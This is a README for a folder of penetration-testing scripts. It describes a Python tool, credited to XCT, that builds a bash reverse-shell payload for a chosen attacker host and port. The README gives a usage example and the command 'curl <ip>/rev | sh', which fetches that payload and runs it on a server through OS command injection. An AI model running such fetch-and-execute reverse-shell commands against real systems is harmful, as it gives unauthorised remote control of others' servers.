# This folder is dedicated to the scripts that are useful for pentest purposes. There are some scripts created by me {Anekant} and some not.
---
## Python reverse shell executer
The original owner: XCT [youtube]
The script is designed to generate a bash script with the specific credentials that are given by the user itself so that he/she can gain the shell via any utility that is present on the server.So that if any os-command injection is there we can use it.
Usage:
```
python3 python_reverse_shell_exectuer.py <lhost> <lport> <filename-you-want-to-give>
```

eg:
python3 resh.py 10.10.14.19 443 rev

execute this on server where os-command-injection is there
```
curl <ip>/rev | sh
```
Refer for more usage: https://youtu.be/FYWGhdaDcZo?si=aUTgz8Ryix8C4LhS
---


